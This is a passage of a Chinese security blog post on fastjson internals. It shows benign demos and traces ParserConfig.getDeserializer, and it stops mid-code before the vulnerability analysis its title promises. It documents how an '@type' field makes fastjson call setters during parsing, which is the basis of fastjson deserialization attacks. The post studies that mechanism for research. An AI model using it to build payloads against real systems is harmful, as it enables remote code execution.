<!DOCTYPE html>
<!--[if lte IE 8 ]>
<html class="ie" xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-US" lang="en-US">
<![endif]-->
<!--[if (gte IE 9)|!(IE)]><!-->
<!--
***************  *      *     *
      8          *    *       *
      8          *  *         *
      8          **           *
      8          *  *         *
      8          *    *       *
      8          *      *     *
      8          *        *   ***********    -----Theme By Kieran(http://go.kieran.top)
-->
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="zh-CN" lang="zh-CN">
<!--<![endif]-->

<head>
  <title>FastJson源码解读+历代反序列化剖析 | s1mple</title>
  <!-- Meta data -->
    <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
    <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta name="generator" content="s1mple">
    <meta name="author" content="s1mple">
    <meta name="description" content="" />
    <meta name="keywords" content="" />

    <!-- Favicon, (keep icon in root folder) -->
    <link rel="Shortcut Icon" href="/img/favicon.ico" type="image/ico">

    <link rel="alternate" href="/atom.xml" title="s1mple" type="application/atom+xml">
    <link rel="stylesheet" href="/css/all.css" media="screen" type="text/css">
    
    <link rel="stylesheet" href="/highlightjs/vs.css" type="text/css">
    

    <!--[if IE 8]>
    <link rel="stylesheet" type="text/css" href="/css/ie8.css" />
    <![endif]-->

    <!-- jQuery | Load our jQuery, with an alternative source fallback to a local version if request is unavailable -->
    <script src="/js/jquery-1.11.1.min.js"></script>
    <script>window.jQuery || document.write('<script src="js/jquery-1.11.1.min.js"><\/script>')</script>

    <!-- Load these in the <head> for quicker IE8+ load times -->
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
    <script src="/js/html5shiv.min.js"></script>
    <script src="/js/respond.min.js"></script>
    <![endif]-->

  
  
  

  <style>.col-md-8.col-md-offset-2.opening-statement img{display:none;}</style>
</head>

<!--
<body class="post-template">
-->
<body id="index" class="lightnav animsition">

      <!-- ============================ Off-canvas navigation =========================== -->

    <div class="sb-slidebar sb-right sb-style-overlay sb-momentum-scrolling">
        <div class="sb-close" aria-label="Close Menu" aria-hidden="true">
            <img src="/img/close.png" alt="Close"/>
        </div>
        <!-- Lists in Slidebars -->
        <ul class="sb-menu">
            <li><a href="/" class="animsition-link" title="Home">Home</a></li>
            <li><a href="/archives" class="animsition-link" title="archive">archives</a></li>
            <!-- Dropdown Menu -->
			 
            <li>
                <a class="sb-toggle-submenu">Works<span class="sb-caret"></span></a>
                <ul class="sb-submenu">
                    
                        <li><a href="/" target="_BLANK" class="animsition-link"></a></li>
                    
                        <li><a href="/atom.xml" target="_BLANK" class="animsition-link"></a></li>
                    
                </ul>
            </li>
            
            
            
            <li>
                <a class="sb-toggle-submenu">Links<span class="sb-caret"></span></a>
                <ul class="sb-submenu">
                    
                    <li><a target="_blank" rel="noopener" href="https://blog.zeddyu.info/" class="animsition-link">陆队</a></li>
                    
                    <li><a target="_blank" rel="noopener" href="https://st4ck.gitee.io/" class="animsition-link">书鱼</a></li>
                    
                    <li><a target="_blank" rel="noopener" href="https://boluochuixue.top/" class="animsition-link">菠萝吹雪</a></li>
                    
                    <li><a target="_blank" rel="noopener" href="https://rmb122.com/" class="animsition-link">rmb</a></li>
                    
                </ul>
            </li>
            
        </ul>
        <!-- Lists in Slidebars -->
        <ul class="sb-menu secondary">
            
            <li><a href="/about.html" class="animsition-link" title="about">About</a></li>
            <li><a href="/atom.xml" class="animsition-link" title="rss">RSS</a></li>
        </ul>
    </div>
    
    <!-- ============================ END Off-canvas navigation =========================== -->

    <!-- ============================ #sb-site Main Page Wrapper =========================== -->

    <div id="sb-site">
        <!-- #sb-site - All page content should be contained within this id, except the off-canvas navigation itself -->

        <!-- ============================ Header & Logo bar =========================== -->

        <div id="navigation" class="navbar navbar-fixed-top">
            <div class="navbar-inner">
                <div class="container">
                    <!-- Nav logo -->
                    <div class="logo">
                        <a href="/" title="Logo" class="animsition-link">
                         <img src="/img/logo.png" alt="Logo" width="35px;"/> 
                        </a>
                    </div>
                    <!-- // Nav logo -->
                    <!-- Info-bar -->
                    <nav>
                        <ul class="nav">
                            <li><a href="/" class="animsition-link">s1mple</a></li>
                            <li class="nolink"><span>Always </span>Creative.</li>
                            
                            <li><a href="https://github.com/" title="Github" target="_blank"><i class="icon-github"></i></a></li>
                            
                            
                            <li><a href="https://twitter.com/" title="Twitter" target="_blank"><i class="icon-twitter"></i></a></li>
                            
                            
                            <li><a href="https://www.facebook.com/" title="Facebook" target="_blank"><i class="icon-facebook"></i></a></li>
                            
                            
                            <li><a href="https://google.com/" title="Google-Plus" target="_blank"><i class="icon-google-plus"></i></a></li>
                            
                            
                            <li><a href="http://weibo.com/" title="Sina-Weibo" target="_blank"><i class="icon-sina-weibo"></i></a></li>
                            
                            <li class="nolink"><span>Welcome!</span></li>
                        </ul>
                    </nav>
                    <!--// Info-bar -->
                </div>
                <!-- // .container -->
                <div class="learnmore sb-toggle-right">More</div>
                <button type="button" class="navbar-toggle menu-icon sb-toggle-right" title="More">
                <span class="sr-only">Toggle navigation</span>
                <span class="icon-bar before"></span>
                <span class="icon-bar main"></span>
                <span class="icon-bar after"></span>
                </button>
            </div>
            <!-- // .navbar-inner -->
        </div>

        <!-- ============================ Header & Logo bar =========================== -->


      
<section id="intro">
    <div class="container">
        <div class="row col-md-offset-2">
            <div class="col-md-8">
    			<span class="post-meta">
      <time datetime="2021-05-20T14:07:49.000Z" itemprop="datePublished">
          2021-05-20
      </time>
    
</span>
                <h1>FastJson源码解读+历代反序列化剖析</h1>
            </div>
        </div>
        <div class="col-md-8 col-md-offset-2">
      		<p>fastjson是阿里巴巴开发的一款处理json和对象的json库，其已经被广泛的应用；</p>
<p>先通过一个简单的demo来体悟下fastjson机制；之前分析过hashmap类，其内部是采用节点的方式内含key和value来进行存储的，就方便拿hashmap来体验下；</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">fastjson</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        HashMap ss = <span class="keyword">new</span> HashMap&lt;String,String&gt;();</span><br><span class="line">        ss.put(<span class="string">&quot;rmb122&quot;</span>,<span class="string">&quot;带哥&quot;</span>);</span><br><span class="line">        ss.put(<span class="string">&quot;菠萝吹雪&quot;</span>,<span class="string">&quot;带哥&quot;</span>);</span><br><span class="line">        String ssstring = JSON.toJSONString(ss);</span><br><span class="line">        System.out.println(<span class="string">&quot;ssstring=&quot;</span>+ssstring);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出结果为</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssstring=&#123;<span class="string">&quot;菠萝吹雪&quot;</span>:<span class="string">&quot;带哥&quot;</span>,<span class="string">&quot;rmb122&quot;</span>:<span class="string">&quot;带哥&quot;</span>&#125;</span><br></pre></td></tr></table></figure>

<p>可以明显的看到json化的结果；在来细致点来看；随便的构造一个类来进行验证；</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">s1mple</span> </span>&#123;</span><br><span class="line"><span class="keyword">public</span> String s1mple;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">int</span> a;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line"><span class="keyword">private</span> String sex;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setA</span><span class="params">(<span class="keyword">int</span> a )</span></span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.a= a;</span><br><span class="line">    System.out.println(<span class="string">&quot;seta()&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> Age)</span></span>&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;setage()&quot;</span>);</span><br><span class="line">    <span class="keyword">this</span>.age = Age;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span>  <span class="keyword">void</span> <span class="title">setSex</span><span class="params">(String sex)</span></span>&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;setsex()&quot;</span>);</span><br><span class="line">    <span class="keyword">this</span>.sex = sex;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getSex</span><span class="params">()</span></span>&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;getsex()&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.sex;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span></span>&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;getage()&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.age;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getA</span><span class="params">()</span></span>&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;geta()&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.a;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">    String s = <span class="string">&quot;\&quot;s1mple=\&quot;&quot;</span>+s1mple;</span><br><span class="line">    <span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">fastjson</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    s1mple s1mple = <span class="keyword">new</span> s1mple();</span><br><span class="line">    s1mple.setA(<span class="number">100</span>);</span><br><span class="line">    s1mple.setSex(<span class="string">&quot;男&quot;</span>);</span><br><span class="line">    String json = JSON.toJSONString(s1mple,SerializerFeature.WriteClassName);</span><br><span class="line">        System.out.println(<span class="string">&quot;=====================&quot;</span>);</span><br><span class="line">    String jsons = <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;s1mple\&quot;,\&quot;a\&quot;:100,\&quot;age\&quot;:0,\&quot;sex\&quot;:\&quot;nan\&quot;,\&quot;s1mple\&quot;:\&quot;aaa\&quot;&#125;&quot;</span>;</span><br><span class="line">    Object jsonsobject  =JSON.parseObject(jsons,s1mple.class);</span><br><span class="line">    System.out.println(jsonsobject);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>回显效果为：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">seta()</span><br><span class="line">setsex()</span><br><span class="line">geta()</span><br><span class="line">getage()</span><br><span class="line">getsex()</span><br><span class="line">=====================</span><br><span class="line">seta()</span><br><span class="line">setage()</span><br><span class="line">setsex()</span><br><span class="line"><span class="string">&quot;s1mple=&quot;</span>aaa</span><br></pre></td></tr></table></figure>

<p>在反json化的时候会自动的调用toString方法；这里拿toString方法夺取类中的s1mple属性；发现其返回为aaa；但是类中并没有定义其修改器；所以这里是直接在反json化的时候就将public的属性给赋值；然而private类型的属性，并不会直接赋值，而是调用其修改器对其属性进行修改；从而达到赋值的效果；简单的追溯一下流程：</p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/cLJ2jS"><img src="https://z3.ax1x.com/2021/04/22/cLJ2jS.png" alt="cLJ2jS.png"></a></p>
<p>反序列化进入parseObject函数；追溯下：</p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/cLJINn"><img src="https://z3.ax1x.com/2021/04/22/cLJINn.png" alt="cLJINn.png"></a></p>
<p>继续一路追溯parseObject方法下去；</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> &lt;T&gt; <span class="function">T <span class="title">parseObject</span><span class="params">(Type type, Object fieldName)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> token = <span class="keyword">this</span>.lexer.token();</span><br><span class="line">    <span class="keyword">if</span> (token == <span class="number">8</span>) &#123;</span><br><span class="line">        <span class="keyword">this</span>.lexer.nextToken();</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (token == <span class="number">4</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (type == <span class="keyword">byte</span>[].class) &#123;</span><br><span class="line">                <span class="keyword">byte</span>[] bytes = <span class="keyword">this</span>.lexer.bytesValue();</span><br><span class="line">                <span class="keyword">this</span>.lexer.nextToken();</span><br><span class="line">                <span class="keyword">return</span> bytes;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (type == <span class="keyword">char</span>[].class) &#123;</span><br><span class="line">                String strVal = <span class="keyword">this</span>.lexer.stringVal();</span><br><span class="line">                <span class="keyword">this</span>.lexer.nextToken();</span><br><span class="line">                <span class="keyword">return</span> strVal.toCharArray();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ObjectDeserializer derializer = <span class="keyword">this</span>.config.getDeserializer(type);</span><br></pre></td></tr></table></figure>

<p>关键点在最后一行，调用ParserConfig类下的getDeserializer方法；传入type；</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ObjectDeserializer <span class="title">getDeserializer</span><span class="params">(Type type)</span> </span>&#123;</span><br><span class="line">    ObjectDeserializer derializer = (ObjectDeserializer)<span class="keyword">this</span>.deserializers.get(type);</span><br><span class="line">    <span class="keyword">if</span> (derializer != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> derializer;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (type <span class="keyword">instanceof</span> Class) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.getDeserializer((Class)type, type);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (type <span class="keyword">instanceof</span> ParameterizedType) &#123;</span><br><span class="line">        Type rawType = ((ParameterizedType)type).getRawType();</span><br><span class="line">        <span class="keyword">return</span> rawType <span class="keyword">instanceof</span> Class ? <span class="keyword">this</span>.getDeserializer((Class)rawType, type) : <span class="keyword">this</span>.getDeserializer(rawType);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> JavaObjectDeserializer.instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>敏感的点是经过第二个if的时候，因为s1mple是Class的实例；所以这里直接调用到getDeserializer方法；</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ObjectDeserializer derializer = (ObjectDeserializer)<span class="keyword">this</span>.deserializers.get(type);</span><br></pre></td></tr></table></figure>

<p>首先经过这个点；追溯不难发现是去IdentityHashMap中Entry的key进行比较，看看其是否相同，因为程序在实力化IdentityHashMap后并无put，所以默认为空，自然不想等；返回null；</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ObjectDeserializer derializer = (ObjectDeserializer)<span class="keyword">this</span>.deserializers.get(type);</span><br><span class="line"><span class="keyword">if</span> (derializer != <span class="keyword">null</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> (ObjectDeserializer)derializer;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    JSONType annotation = (JSONType)clazz.getAnnotation(JSONType.class);</span><br><span class="line">    <span class="keyword">if</span> (annotation != <span class="keyword">null</span>) &#123;</span><br><span class="line">        Class&lt;?&gt; mappingTo = annotation.mappingTo();</span><br><span class="line">        <span class="keyword">if</span> (mappingTo != Void.class) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.getDeserializer(mappingTo, mappingTo);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>接着去进行比对，其依然是null；，进入else；这里追溯下最后annotation也为null；进入if判断</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (type <span class="keyword">instanceof</span> WildcardType || type <span class="keyword">instanceof</span> TypeVariable || type <span class="keyword">instanceof</span> ParameterizedType) &#123;</span><br><span class="line">    derializer = (ObjectDeserializer)<span class="keyword">this</span>.deserializers.get(clazz);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>传入的type为class对象，所以全部pass；</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (derializer != <span class="keyword">null</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> (ObjectDeserializer)derializer;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    String className = clazz.getName();</span><br><span class="line">    className = className.replace(<span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里简单看下不难发现是直接else；因为原本Entry中就没有put；所以derializer比对结果自然为null；进入else的逻辑链路看下；敏感点已经标出在代码块中；</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    String className = clazz.getName();</span><br><span class="line">    className = className.replace(<span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (className.startsWith(<span class="string">&quot;java.awt.&quot;</span>) &amp;&amp; AwtCodec.support(clazz) &amp;&amp; !awtError) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">this</span>.deserializers.put(Class.forName(<span class="string">&quot;java.awt.Point&quot;</span>), AwtCodec.instance);</span><br><span class="line">            <span class="keyword">this</span>.deserializers.put(Class.forName(<span class="string">&quot;java.awt.Font&quot;</span>), AwtCodec.instance);</span><br><span class="line">            <span class="keyword">this</span>.deserializers.put(Class.forName(<span class="string">&quot;java.awt.Rectangle&quot;</span>), AwtCodec.instance);</span><br><span class="line">            <span class="keyword">this</span>.deserializers.put(Class.forName(<span class="string">&quot;java.awt.Color&quot;</span>), AwtCodec.instance);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable var11) &#123;</span><br><span class="line">            awtError = <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        derializer = AwtCodec.instance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!jdk8Error) &#123;<span class="comment">//进入次if段；</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (className.startsWith(<span class="string">&quot;java.time.&quot;</span>)) &#123;<span class="comment">//显然不满足；</span></span><br><span class="line">                <span class="keyword">this</span>.deserializers.put(Class.forName(<span class="string">&quot;java.time.LocalDateTime&quot;</span>), Jdk8DateCodec.instance);</span><br><span class="line">                <span class="keyword">this</span>.deserializers.put(Class.forName(<span class="string">&quot;java.time.LocalDate&quot;</span>), Jdk8DateCodec.instance);</span><br><span class="line">                <span class="keyword">this</span>.deserializers.put(Class.forName(<span class="string">&quot;java.time.LocalTime&quot;</span>), Jdk8DateCodec.instance);</span><br><span class="line">                <span class="keyword">this</span>.deserializers.put(Class.forName(<span class="string">&quot;java.time.ZonedDateTime&quot;</span>), Jdk8DateCodec.instance);</span><br><span class="line">                <span class="keyword">this</span>.deserializers.put(Class.forName(<span class="string">&quot;java.time.OffsetDateTime&quot;</span>), Jdk8DateCodec.instance);</span><br><span class="line">                <span class="keyword">this</span>.deserializers.put(Class.forName(<span class="string">&quot;java.time.OffsetTime&quot;</span>), Jdk8DateCodec.instance);</span><br><span class="line">                <span class="keyword">this</span>.deserializers.put(Class.forName(<span class="string">&quot;java.time.ZoneOffset&quot;</span>), Jdk8DateCodec.instance);</span><br><span class="line">                <span class="keyword">this</span>.deserializers.put(Class.forName(<span class="string">&quot;java.time.ZoneRegion&quot;</span>), Jdk8DateCodec.instance);</span><br><span class="line">                <span class="keyword">this</span>.deserializers.put(Class.forName(<span class="string">&quot;java.time.ZoneId&quot;</span>), Jdk8DateCodec.instance);</span><br><span class="line">                <span class="keyword">this</span>.deserializers.put(Class.forName(<span class="string">&quot;java.time.Period&quot;</span>), Jdk8DateCodec.instance);</span><br><span class="line">                <span class="keyword">this</span>.deserializers.put(Class.forName(<span class="string">&quot;java.time.Duration&quot;</span>), Jdk8DateCodec.instance);</span><br><span class="line">                <span class="keyword">this</span>.deserializers.put(Class.forName(<span class="string">&quot;java.time.Instant&quot;</span>), Jdk8DateCodec.instance);</span><br><span class="line">                derializer = (ObjectDeserializer)<span class="keyword">this</span>.deserializers.get(clazz);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (className.startsWith(<span class="string">&quot;java.util.Optional&quot;</span>)) &#123;<span class="comment">//显然也不满足；</span></span><br><span class="line">                <span class="keyword">this</span>.deserializers.put(Class.forName(<span class="string">&quot;java.util.Optional&quot;</span>), OptionalCodec.instance);</span><br><span class="line">                <span class="keyword">this</span>.deserializers.put(Class.forName(<span class="string">&quot;java.util.OptionalDouble&quot;</span>), OptionalCodec.instance);</span><br><span class="line">                <span class="keyword">this</span>.deserializers.put(Class.forName(<span class="string">&quot;java.util.OptionalInt&quot;</span>), OptionalCodec.instance);</span><br><span class="line">                <span class="keyword">this</span>.deserializers.put(Class.forName(<span class="string">&quot;java.util.OptionalLong&quot;</span>), OptionalCodec.instance);</span><br><span class="line">                derializer = (ObjectDeserializer)<span class="keyword">this</span>.deserializers.get(clazz);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable var10) &#123;</span><br><span class="line">            jdk8Error = <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (className.equals(<span class="string">&quot;java.nio.file.Path&quot;</span>)) &#123;<span class="comment">//不满足</span></span><br><span class="line">        <span class="keyword">this</span>.deserializers.put(clazz, MiscCodec.instance);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (clazz == Entry.class) &#123;<span class="comment">//为 s1mple.class，显然不满足；</span></span><br><span class="line">        <span class="keyword">this</span>.deserializers.put(clazz, MiscCodec.instance);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ClassLoader classLoader = Thread.currentThread().getContextClassLoader();<span class="comment">//调用classLoader</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Iterator var6 = ServiceLoader.load(AutowiredObjectDeserializer.class, classLoader).iterator();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(var6.hasNext()) &#123;</span><br><span class="line">            AutowiredObjectDeserializer autowired = (AutowiredObjectDeserializer)var6.next();</span><br><span class="line">            Iterator var8 = autowired.getAutowiredFor().iterator();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span>(var8.hasNext()) &#123;</span><br><span class="line">                Type forType = (Type)var8.next();</span><br><span class="line">                <span class="keyword">this</span>.deserializers.put(forType, autowired);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception var12) &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (derializer == <span class="keyword">null</span>) &#123;</span><br><span class="line">        derializer = (ObjectDeserializer)<span class="keyword">this</span>.deserializers.get(type);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (derializer != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> (ObjectDeserializer)derializer;</span><br><span 